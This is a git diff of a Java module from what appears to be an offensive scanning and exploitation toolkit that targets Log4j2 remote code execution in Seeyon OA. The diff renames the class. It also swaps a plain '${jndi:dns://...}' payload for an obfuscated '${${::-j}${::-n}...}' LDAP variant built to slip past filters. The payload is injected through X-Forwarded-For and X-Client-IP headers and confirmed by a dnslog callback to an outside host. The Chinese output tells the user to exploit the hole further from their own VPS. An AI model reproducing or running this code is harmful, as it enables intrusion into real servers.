@@ -1,14 +1,13 @@
-package Exp.OA.zhiyuanoa;
+package Exp.OA.seeyonoa;
 
 import Utilss.HttpTools;
 import Utilss.Response;
 import Utilss.shell;
 import core.Exploitlnterface;
 import javafx.scene.control.TextArea;
-
 import java.util.HashMap;
 
-public class zhiyuanoa_main_log4j2 implements Exploitlnterface {
+public class seeyonoa_main_log4j2 implements Exploitlnterface {
     @Override
     public Boolean checkVul(String url, TextArea textArea) {
         Boolean att = att(url, textArea);
@@ -22,7 +21,7 @@ public class zhiyuanoa_main_log4j2 implements Exploitlnterface {
     }
 
     private Boolean att(String url,TextArea textArea){
-        String log4jpayload = "${jndi:dns://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "}";
+        String log4jpayload = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "}";
         HashMap<String,String> head = new HashMap();
         head.put("X-Forwarded-For", log4jpayload);
         head.put("X-Client-IP", log4jpayload);
@@ -40,10 +39,10 @@ public class zhiyuanoa_main_log4j2 implements Exploitlnterface {
         int dns_2 = dns_le2.getText().length();
 
         if(dns_2 > dns_1 && response.getCode() == 200){
-            textArea.appendText("\nlog4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
+            textArea.appendText("\n log4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
             return true;
         }else {
-            textArea.appendText("\nzhiyuanoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
+            textArea.appendText("\n seeyonoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
             return false;
         }
 
